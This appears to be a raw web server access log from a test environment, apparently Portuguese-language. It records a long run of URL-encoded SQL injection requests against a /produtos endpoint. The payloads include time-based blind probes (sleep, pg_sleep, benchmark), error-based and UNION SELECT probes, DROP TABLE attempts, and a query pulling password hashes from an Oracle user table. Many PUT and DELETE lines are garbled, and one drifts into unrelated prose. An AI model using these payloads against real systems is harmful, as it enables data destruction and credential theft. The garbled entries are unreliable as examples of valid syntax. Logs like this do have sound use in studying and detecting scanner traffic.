Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/test1%22%20)%20)%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20%22sibm%22%20=%20%22sibm%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20)%20as%20rwsn%20where%209946%20=%209946%20or%20extractvalue%20(%201297,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%201297%20=%201297,1%20)%20)%20)%20,0x717a767a71%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20where%202330%20=%202330%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test-3587'%20)%20or%205023%20=%20ctxsys.drithsx.sn%20(%205023,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%205023%20=%205023%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C HTTP/1.1
172.18.0.1 - GET /produtos/test-1772'%20or%207911%20=%204985 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20where%209003=9003%20and%20make_set(5868=8316,8316)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%7C%7C%20(%20select%20'sbip'%20from%20dual%20where%207302%20=%207302%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20and%20(%20(%20'tjvy'%20like%20'tjvy HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20or%207427%20=%20dbms_pipe.receive_message%20(%20chr%20(%20116%20)%20%7C%7Cchr%20(%2087%20)%20%7C%7Cchr%20(%2090%20)%20%7C%7Cchr%20(%20109%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20(%20(%20'ljhc'%20=%20'ljhc HTTP/1.1
172.18.0.1 - GET /produtos/testAND%201%20=%20utl_inaddr.get_host_address%20(%20(%20SELECT%20DISTINCT%20(%20PASSWORD%20)%20FROM%20(%20SELECT%20DISTINCT%20(%20PASSWORD%20)%20,%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$%20)%20WHERE%20LIMIT%20=%208%20)%20)%20AND%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test1%20where%208948%20=%208948%20and%20row%20(%206237,7469%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206237%20=%206237,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%20)%20a HTTP/1.1
172.18.0.1 - GET /produtos/test-4239%20or%202724%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%202724%20=%202724%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char%20(%20113%20) HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20where%204588%20=%204588 HTTP/1.1
172.18.0.1 - GET /produtos/test-1268%22%20)%20)%20or%208571%20=%208571%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20)%20)%20)%20or%202633%20=%20dbms_pipe.receive_message%20(%20chr%20(%20112%20)%20%7C%7Cchr%20(%2065%20)%20%7C%7Cchr%20(%2065%20)%20%7C%7Cchr%20(%20103%20)%20,5%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/testUNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20b HTTP/1.1
172.18.0.1 - GET /produtos/test1'%7C%7C%20(%20select%20'feki'%20where%204082%20=%204082%20and%20(%203587%20=%204207%20)%20*4207%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20as%20bsvl%20where%209378%20=%209378%20and%206894%20=%20benchmark%20(%205000000,md5%20(%200x694a4745%20)%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20LIcE%20tru HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyuseri HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure,%20'as%20userin',%20'pavs'%20%3E HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'SANJ'%20LIKe%20'vaJ'%20)%20,(SELeCT%20(SELECT%201))%20oR%20'''%20noT%20Like%20'''%20AND%20True%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20byt1,1,1%20)%20)%20anD%20'1'%20=%20'1'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,evertime%20=%20'1, HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'DboC'%20)%20,(SELECT%20(SELECT%201))%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,matebue%20tame_ame%20)%20; HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20usercameredom'int','table_mast'))%20%3C'waitfor%20'tale HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,evertime%20(%20'1,1,0b1110111101%20)%20)%20(%20select%201140%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LiKE%20'3'%20%7C%7C%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20becneramer%20table%20and%20'cast'%20=%20'cast%20)%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'1A HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo2'%20%3C)%20,2b0x1,(sEleCT%20(SELECT%200))%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20'4'='7'%20OR%20False HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20ly$)%20all%20the%20(%20select%20@@vertion'%20)%20'%3E' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabctame%20and%20'i'%20=%20'1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20(%20table_samerial,%20select%20valse%20(%20tems_%20dimetix%20sysite.stinct%20(....%20Libel_mages%20an%20tvolums%20and%20GEANE%20feels%20that%20here).%20The%20story%20is%20definitely%20one%20of%20the%20most%20horroring%20cast%20and%20gratest%20the%20trailer%20and%20transformity%20aurpertic HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verale_tembent%20tames%20tF HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test-6744%22%20or%205903%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20or%207417%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'jzwq'%20where%203289%20=%203289%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20)%20as%20vzgo%20where%206281%20=%206281%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20where%206679%20=%206679%20rlike%20sleep%20(%205%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20nxfu%20where%205962%20=%205962%20and%206510%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20)%20or%208466%20=%20benchmark%20(%205000000,md5%20(%200x694a4745%20)%20)%20and%20(%20(%20%22zlwb%22%20=%20%22zlwb HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20)%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20(%20'ofrt'%20like%20'ofrt HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20upgb%20where%202031%20=%202031 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'+(select%20'qmdx'%20where%209083=9083%20procedure%20analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1) HTTP/1.1
172.18.0.1 - PUT /produtos/test0O1'%20)%20)%20AS%20JBaD%20wHERe%20(SeleCt%20(seleCt%200X167d))%20Like%209X0o3595%7Dor%20CHar%20(%20(SElEcT%20(seleCt%20(SELecT%20(SeLECT%20(SelECT%20(SElect%20(SELECT%20113)))))))%20)%20OR%20cHAr%20(%20(SELECT%200x63)%20)%20Or%20cHAr%20(%20(seLect%2065)%20)%20Or%20Char%20(%20(SELECT%20119)%20)%20OR%20ChAr HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20or%207427%20=%20dbms_pipe.receive_message%20(%20chr%20(%20116%20)%20%7C%7Cchr%20(%2087%20)%20%7C%7Cchr%20(%2090%20)%20%7C%7Cchr%20(%20109%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20*%20from%20users%20where%20id%20=%20'1'%20or%20%5C%3C$%20or%201%20=%201%20--%201' HTTP/1.1
172.18.0.1 - PUT /produtos/test-8515'%20or%201329%20=%209536 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20) HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20and%20(%20(%20'hxcq'%20=%20'hxcq HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25%22%20)%20)%20)%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20sleep%20(%205%20)%20and%20%22irxg%22%20=%20%22irxg HTTP/1.1
172.18.0.1 - PUT /produtos/test0x1'%20)%20And%20(sELECT%200Xb25)%20liKe%20caSt%20(%20(%20cHr%20(~%20(SelEct%20(sELEcT%200x71))%20)%20or%20chr%20(%20(seLECT%20(sElECt%20(sElEcT%20(selECt%20(SELECT%20113)))))%20)%20OR%20Chr%20(%200B1011070%20)%20OR%20Chr%20(%20%7B0X71%20)%20or%20chr%20(%200B0x0o150%20)%20or%20cHR%20(%20(SElEct%20(Sel)))) HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20)%20or%208514%20=%20benchmark%20(%205000000,md5%20(%200x544d5a4c%20)%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20and%204241%20=%20convert%20(%20int,%20(%20select%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%204241%20=%204241%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test-2733'%20)%20)%20)%20or%204144%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204144%20=%204144%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20'wytg'%20=%20'wytg HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%206244%20=%206244%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test-8098'%20)%20or%204747%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204747%20=%204747%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20jtfx%20where%208038%20=%208038 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20as%20gqzy%20where%202312%20=%202312%20or%205286%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20nmlm%20where%209872%20=%209872 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20FROM%20tubl_NIDeRgecimensering%20(%20case%20112%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20srmq%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22)))) HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'inve'%20time%20ant%20tibsencemant%20') HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20-%20Table_name,%20CRocnumelop!%20(%20HanCiT*%20=%205X1%20and%20tRue%20or%200%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verale,numelet',lase;'nucat' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20'U&@tel%20like%20' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ean/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@verscomance);)%20%3C@@Or%200X1%20Or%200X0%20And%20(SelEcT%20(SELECT%201))%20oR%20False HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure%20,%20'asenupel,%20(%20'pacswaphel'%20'vape,'hap'%20)%20,%20gave%20vers HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentytale%20)%20'ant'%20=%20'viga HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybes%20lyateve%20)%20-%20vable%20)%20,1,1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,ule,tale_pam_ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20)%20,%20username%20table%20viledint%20';%20'%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$),%20gancer%20)%20then%20select%201%20alden/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%20'yarn'%20=%20'yarn HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20where%202070%20=%202070 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20and%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%203484%20=%203484,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20)%20)%20and%20(%20(%20'ydpe'%20=%20'ydpe%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'osyu'%20from%20dual%20where%207639%20=%207639%20and%208594%20=%20(%20select%208594%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'hsff'%20where%201042%20=%201042%20and%206510%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20yfvg%20where%201454%20=%201454%20and%20row%20(%206237,7469%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206237%20=%206237,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%205192%20union%20select%203785%20union%20select%203931%20union%20s HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20or%209643%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20'tfso'%20=%20'tfso%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20as%20jiyl%20where%204893%20=%204893%20union%20all%20select%20null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20113 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%209072%20=%209072%20and%20elt%20(%204249%20=%204249,7259%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test-6075'%20union%20all%20select%209988,9988,9988,9988,9988,9988,9988,9988,9988 HTTP/1.1
172.18.0.1 - DELETE /produtos/test-1361%20where%207195%20=%207195%20or%201029%20=%205786%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20and%206969%20=%20(%20select%206969%20from%20pg_sleep%20(%205%20)%20)%20and%20(%20(%20(%20'qrtf'%20=%20'qrtf HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20wufr%20where%205239%20=%205239%20or%209643%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20where%209221%20=%209221%20and%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%203484%20=%203484,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test-3955)%20where%209781=9781%20union%20all%20select%209718,9718,9718,9718,9718%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%205413%20=%205413%20and%208198%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20and%20elt%20(%204249%20=%204249,7259%20)%20and%20(%20'bkag'%20=%20'bkag HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20where%202370%20=%202370%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20and%208635%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
